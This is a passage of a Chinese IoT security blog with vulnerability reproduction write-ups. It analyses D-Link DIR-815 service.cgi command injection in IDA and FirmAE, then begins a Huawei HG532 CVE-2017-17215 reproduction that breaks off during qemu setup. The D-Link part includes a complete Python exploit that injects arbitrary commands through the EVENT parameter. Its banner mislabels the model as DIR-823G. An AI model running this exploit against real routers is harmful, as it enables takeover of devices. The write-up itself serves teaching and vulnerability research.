src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/18.png"></p><h2 id="D-Link-DIR-615-645-815-命令执行漏洞"><a href="#D-Link-DIR-615-645-815-命令执行漏洞" class="headerlink" title="D-Link DIR 615&#x2F;645&#x2F;815 命令执行漏洞"></a>D-Link DIR 615&#x2F;645&#x2F;815 命令执行漏洞</h2><h3 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a><strong>固件下载</strong></h3><p>固件下载:<br><a href="https://ftp.dlink.ru/pub/Router/DIR-815/Firmware/RevA/">https://ftp.dlink.ru/pub/Router/DIR-815/Firmware/RevA/</a><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/19.png"></p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h3><p>官方漏洞描述:<br><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01084">国家信息安全漏洞共享平台</a><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/20.png"></p><p>我们使用 <code>binwalk</code> 分解固件之后我们进入 <code>_DIR815A1_FW103b01.bin.extracted/squashfs-root/htdocs/web</code> 文件夹下，使用 <code>ls -la</code> 命令就可以看到，这个 <code>service.cgi</code> 实际是一个软连接，本质上是 <code>cgibin</code> 这个文件<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/21.png"></p><p>下面我们将这个 <code>cgibin</code> 放入ida中分析<br>同样通过字符串定位<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/22.png"></p><p>找到这个叫做 <code>servicecgi_main</code> 的函数<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/23.png"></p><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/24.png"></p><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/25.png"></p><p>也就是漏洞利用的路径为 <code>servicecgi_main -&gt; lxmldbc_system -&gt; system</code></p><p>下面详细分析漏洞的利用过程</p><p>在 <code>servicecgi_main函数</code> 的开头获取传参方式并进行判断<br>这里的逻辑为 如果为 <code>POST</code> 则进入 <code>大if</code> 将 <code>v2赋值为1024</code> 如果不为 <code>POST</code> 则进入 <code>大else</code> 然后判断是否为 <code>GET</code><br>如果为 <code>GET</code> 则将 <code>v2赋值为64</code> 如果既不是 <code>POST</code> 也不是 <code>GET</code> 则会执行 <code>goto LABEL_10</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/26.png"></p><p>而 <code>goto LABEL_10</code> 会导致直接跳过 <code>lxmldbc_system函数</code> ，所以我们的传参方式需要为 <code>POST</code> 或者 <code>GET</code> 其中之一<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/27.png"></p><p>在往下看，这里有一个 <code>cgibin_parse_request(sub_40A63C, 0, v2) &gt;= 0</code> 的判断<br>也就是说 <code>cgibin_parse_request(sub_40A63C, 0, v2)</code> 的返回值不能为负数，否则也会执行 <code>goto</code> 导致无法运行到 <code>system</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/28.png"></p><p>我们进入 <code>cgibin_parse_request</code> 这个函数中<br>可以看到函数开头使用 <code>getenv</code> 函数获取了几个环境变量，这里我们就可以判断出，如果我们想要利用漏洞就一定需要使用POST传参方式，原因如下</p><ul><li><code>CONTENT_LENGTH</code> 表示请求体长度</li><li>GET 请求的请求体长度为 ​<strong>​0​</strong>​，因此 <code>getenv(&quot;CONTENT_LENGTH&quot;)</code> 返回 <code>NULL</code></li><li>只有 POST 请求才有非零的 <code>CONTENT_LENGTH</code></li></ul><p>然后下面的 <code>v12</code> 是获取到环境变量中的 <code>?</code> 后面的内容，并且后续将作为参数传入到函数<code>sub_402B40</code>中</p><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/29.png"></p><p>下面我们进入 <code>sub_402B40(&amp;v20, v12, v13);函数</code> 中查看</p><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/30.png"></p><p>我们可以看到传入的 <code>v12</code> 是 其中的 <code>a2</code> 并且其中还有一个 <code>v12</code> 而这个 <code>v12 = *(a2+v6)</code> 并且这个 <code>v6从0</code> 开始计算，也就相当于将 <code>a2</code> 一个个取出并且用于判断，通过判断 <code>&amp;</code> 和 <code>=</code> 来对 <code>v12</code> 进行拆分</p><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/31.png"></p><p>所以根据分析 我们可以知道 <code>sub_402B40函数</code> 是一个 ​<code>HTTP查询字符串解析器</code>​​，专门用于 <code>解析URL中的查询参数</code>（如 <code>?key1=value1&amp;key2=value2</code>）</p><p>下面我们回到 <code>cgibin_parse_request</code> 继续往下看<br>我们必须进入这个<code>if分支</code>，并且执行这个 <code>return ((&amp;off_42C014)[3 * v16 - 1])(a1, a2, v7, &amp;v14[v17]);</code><br>因为下面全都是 <code>return 负数</code> 这会导致我们返回到 <code>servicecgi_main</code> 中的时候会进入上述我们提到的 <code>if分支</code> 然后就会执行 <code>goto</code> 导致无法执行 <code>system函数</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/32.png"></p><p>而这里的return逻辑 <code>if ( !strncasecmp(v14, v18, v17) )</code> 就是我们的 <code>v14</code> 的 <code>前v17个字节</code> 需要和 <code>v18相同</code><br>而这里的 <code>v18 = *v15 = off_42C014</code><br>所以需要看这个 <code>全局变量off_42C014</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/33.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/34.png"></p><p>而 <code>off_42C014</code> 开头的字符串为 <code>application/</code> (其实这里固定套路了，大多数时候都是 <code>application/x-www-form-urlencoded</code>)</p><p>我们继续往下分析我们可以知道他最终是会调用 <code>sub_403B10</code> 这个函数<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/35.png"><br>这个函数的开头同样也是一个判断，继续进行比较后续的字符串是否为 <code>x-www-form-urlencoded</code> 所以其实我们最终需要传入的那个环境变量<code>Content-Type</code>为 <code>application/x-www-form-urlencoded</code> 才符合条件</p><p>而这个 <code>application/x-www-form-urlencoded</code> 是一种 ​<strong>​HTTP 请求内容编码格式​</strong>​，主要用于 HTML 表单（<code>&lt;form&gt;</code>）提交数据时的默认编码方式，它是 Web 开发中最基础的数据传输格式之一，用于 <code>POST</code> </p><p>所以接着我们会进入 <code>sub_402FFC</code><br>在 <code>sub_402FFC</code> 中同样有 <code>sub_402B40</code> 用于切割字符串，这里不再详细分析<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/36.png"></p><p>下面回到 <code>servicecgi_main</code> 继续往下看有一个 <code>sess_ispoweruser</code><br>这个函数里面有很多子函数，里面的子函数会打开很多文件，如果我们直接使用qemu之类去模拟仿真的时候会因为缺少这些文件而导致复现失败，所以这里复现的时候我们一般就直接将它nop掉就行了</p><p>然后终于就是到了我们的漏洞部分<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/37.png"></p><p>这里可以看到 <code>v5</code> 的内容会被拼接到system的指令中去，而 <code>v5</code> 是我们用户可控的部分，这也是漏洞产生的原因</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h3><p>使用FirmAE进行仿真<br>这里我们先不修改直接使用下载的.bin文件来试一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./run.sh -d dlink &lt;DIR815A1_FW103b01.bin的路径&gt;</span><br></pre></td></tr></table></figure><p><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/38.png"></p><p>仿真成功后可以使用浏览器进行访问  <code>192.168.0.1:80</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/39.png"></p><p>下面编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target_ip, command</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    利用 D-Link 路由器命令注入漏洞执行任意命令</span></span><br><span class="line"><span class="string">    :param target_ip: 路由器IP地址 (FirmAE仿真地址)</span></span><br><span class="line"><span class="string">    :param command: 要执行的系统命令</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 构造恶意URL（关键注入点）</span></span><br><span class="line">    payload = <span class="string">f&quot;;<span class="subst">&#123;command&#125;</span>;&quot;</span></span><br><span class="line">    encoded_payload = urllib.parse.quote(payload, safe=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    vuln_url = <span class="string">f&quot;http://<span class="subst">&#123;target_ip&#125;</span>/service.cgi?EVENT=<span class="subst">&#123;encoded_payload&#125;</span>&amp;abc&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置恶意请求头</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;14&quot;</span>,  <span class="comment"># 必须与body长度匹配</span></span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>  <span class="comment"># 防止连接复用问题</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 固定请求体（触发漏洞必需）</span></span><br><span class="line">    data = <span class="string">&quot;XiDP=BabyPwner&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送恶意请求</span></span><br><span class="line">        response = requests.post(</span><br><span class="line">            vuln_url,</span><br><span class="line">            headers=headers,</span><br><span class="line">            data=data,</span><br><span class="line">            timeout=<span class="number">5</span>,</span><br><span class="line">            verify=<span class="literal">False</span>  <span class="comment"># 忽略SSL证书验证</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查响应状态</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 命令注入成功！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 响应内容:\n<span class="subst">&#123;response.text[:<span class="number">500</span>]&#125;</span>...&quot;</span>)  <span class="comment"># 显示部分响应</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 请求失败！状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 网络错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------- D-Link DIR-823G 命令注入漏洞 (CNVD-2018-01084) -------&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置目标IP（FirmAE仿真地址）</span></span><br><span class="line">    target_ip = <span class="string">&quot;192.168.0.1&quot;</span>  <span class="comment"># 修改为实际仿真IP</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取用户输入命令</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&quot;command&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> cmd.lower() <span class="keyword">in</span> [<span class="string">&quot;exit&quot;</span>, <span class="string">&quot;quit&quot;</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 执行漏洞利用</span></span><br><span class="line">        exploit(target_ip, cmd)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 验证命令执行（可选）</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&gt;&quot;</span> <span class="keyword">in</span> cmd:  <span class="comment"># 如果命令有输出文件</span></span><br><span class="line">            output_file = cmd.split(<span class="string">&quot;&gt;&quot;</span>)[-<span class="number">1</span>].strip()</span><br><span class="line">            check_url = <span class="string">f&quot;http://<span class="subst">&#123;target_ip&#125;</span>/<span class="subst">&#123;output_file&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                check_res = requests.get(check_url, timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">if</span> check_res.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] 命令输出已保存到: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[*] 内容预览:\n<span class="subst">&#123;check_res.text[:<span class="number">200</span>]&#125;</span>...&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] 无法验证输出文件: <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里如果我们直接运行脚本然后输入指令最后显示的结果是FAILED也就是失败了，这是因为我们还没有去掉上面我们提到的 <code>sess_ispoweruser</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/40.png"></p><p>下面我们将<code>.bin</code>文件使用<code>binwalk</code>进行分解，然后使用IDA将<code>cgibin</code>中<code>sess_ispoweruser</code>函数去掉<br>下面是程序nop修改之后的样子 下面的 <code>v4</code> 就是我们上面提到的 <code>v5</code><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/41.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/42.png"></p><p>去掉之后我们通过IDA将修改后的部分保存，然后替换掉原本的 <code>cgibin</code> 文件<br>然后我们回到 <code>squashfs-root</code> 文件夹执行下面指令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mksquashfs ./squashfs-root/ ./rootfs.squashfs -comp gzip</span><br></pre></td></tr></table></figure><p>然后我们就可以得到 <code>rootfs.squashfs</code> 这个文件<br>我们再次使用FirmAE进行仿真<br>使用下面指令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./run.sh -d dlink &lt;rootfs.squashfs的路径&gt;</span><br></pre></td></tr></table></figure><p>仿真成功后再次使用我们的exp，发现现在是显示 <code>OK</code> 了，创建文件也可以成功了 (但是我试了一下，ls依旧是没有回显的)<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/43.png"><br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/44.png"></p><p>这里虽然我们直接使用ls没有回显，但是我们可以创建文件来读取，如下<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/45.png"></p><p>想要读取完整内容，我们可以直接通过浏览器网址访问对应文件<br><img src="/../picture/IOT%E5%85%A5%E9%97%A8--%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/46.png"></p><p>浏览器可以直接下载我们使用命令创建的文件<br>那么这个漏洞就复现到这里</p><p>参考:<br><a href="https://www.iotsec-zone.com/article/456#di-8100">D-Link DI-8100命令执行漏洞复现 - IOTsec-Zone</a><br><a href="https://www.iotsec-zone.com/article/454#%E6%BC%8F%E6%B4%9E%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">D-Link DI-8100命令注入 &amp;&amp; 调试分析 - IOTsec-Zone</a><br><a href="https://mp.weixin.qq.com/s/8FwdueaInaIvFVMLMY678Q">D-Link DIR 615&#x2F;645&#x2F;815 service.cgi远程命令执行漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> CVE复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOT </tag>
            
            <tag> CVE </tag>
            
            <tag> 路由器 </tag>
            
            <tag> 远程命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-17215 华为HG532路由器RCE漏洞复现</title>
      <link href="/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/07/12/CVE-2017-17215%20%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h3><p><code>CVE-2017-17215</code>是<code>CheckPoint</code>团队披露的远程命令执行（<code>RCE</code>）漏洞，存在于华为<code>HG532</code>路由器中。<br>该设备支持名为<code>DeviceUpgrade</code>的一种服务类型，可通过向<code>/ctrlt/DeviceUpgrade_1</code>的地址提交请求，来执行固件的升级操作。<br>可通过向<code>37215</code>端口发送数据包，启用<code>UPnP</code>协议服务，并利用该漏洞，在<code>NewStatusURL</code>或<code>NewDownloadURL</code>标签中注入任意命令以执行。</p><p>漏洞披露:<a href="https://research.checkpoint.com/2017/good-zero-day-skiddie/">https://research.checkpoint.com/2017/good-zero-day-skiddie/</a></p><p>附件下载:<br>通过网盘分享的文件：HG532eV100R001C02B015_upgrade_main.bin<br>链接: <a href="https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp">https://pan.baidu.com/s/1r9fkxyNBKFhvu0uDRKzElg?pwd=xidp</a> 提取码: xidp</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h3><p>根据官方的漏洞报告，我们知道漏洞存在于<code>/bin/upnp</code>二进制文件<br>按照官方报告中提到的 <code>NewStatusURL</code> 或 <code>NewDownloadURL</code> 两个字符串进行定位，找到漏洞点位于 <code>sub_407B20</code> 这个函数中<br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p><p>漏洞点存在于上图中的 <code>第18行</code>，这个 <code>snprintf函数</code> 会将我们发送的标签内容写入字符串，并且之后会使用 <code>system</code> 执行该字符串<br>这就很明显会存在一个任意命令执行漏洞<br><code>snprintf函数</code> 会将我们发送的标签内容写入 <code>v6</code> 中，而下面的 <code>system函数</code> 会将 <code>v6</code> 中字符串的内容当做命令来执行，显然这是一个命令执行漏洞，我们可以在<code>NewStatusURL</code>或<code>NewDownloadURL</code>标签中注入任意命令以执行</p><h3 id="基础的环境配置"><a href="#基础的环境配置" class="headerlink" title="基础的环境配置"></a><strong>基础的环境配置</strong></h3><p>基础的IOT环境配置(<code>binwalk/sasquatch/qemu</code>等)可以参考这篇文章中的环境配置: <a href="https://xz.aliyun.com/news/18079">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现-先知社区</a></p><h3 id="使用qemu复现漏洞"><a href="#使用qemu复现漏洞" class="headerlink" title="使用qemu复现漏洞"></a><strong>使用qemu复现漏洞</strong></h3><p>下载地址 : <a href="https://people.debian.org/~aurel32/qemu/mips/">Index of &#x2F;~aurel32&#x2F;qemu&#x2F;mips</a><br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p><p>需要准备 <code>vmlinux-2.6.32-5-4kc-malta</code> 内核以及 <code>debian_squeeze_mips_standard.qcow2</code> 镜像文件</p><p><code>注意: 这里最好不要使用别的版本的内核，因为我们后面运行mic可执行程序对内核版本有要求，过高或过低都会导致mic文件启动失败从而导致无法复现</code></p><p>使用下面 <code>start.sh脚本</code> 来启动 <code>qemu虚拟机</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start.sh</span></span><br><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap</span><br></pre></td></tr></table></figure><p>使用 <code>chmod +x start.sh</code> 命令给脚本赋予权限， 最后使用 <code>./start.sh</code> 命令启动 <code>qemu虚拟机</code><br><code>qemu虚拟机</code> 的初始账号和密码均为 <code>root</code></p><p>进入虚拟机后使用 <code>ip addr</code> 命令来查看一下网卡，一般是 <code>eth1</code><br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p><p>下面我们使用 <code>nano /etc/network/interfaces</code> 这个命令修改 <code>interfaces</code> 文件中的内容为如下<br><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"><br>也就是将其中的 <code>eth0</code> 修改为 <code>eth1</code><br>然后退出之后执行 <code>ifup eth1</code> 执行结束之后我们就使用 <code>ip addr</code> 继续查看 <code>qemu虚拟机</code> 的 <code>ip地址</code></p><p><img src="/../picture/CVE-2017-17215%E5%8D%8E%E4%B8%BAHG532%E8%B7%AF%E7%94%B1%E5%99%A8RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p><p>然后我们就可以使用ssh来连接了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=ssh-rsa root@<span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span></span><br></pre></td></tr></table></figure><p>这里有可能会报错，如果我们之前使用过别的 <code>qemu虚拟机</code>，并且另外一个 <code>qemu虚拟机</code> 仿真的时候也使用这个同样的虚拟ip地址<br>那么就会导致同一个ip地址链接的时候本地保存的密钥对不上，会出现以下错误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY! Someone could be eavesdropping on you right 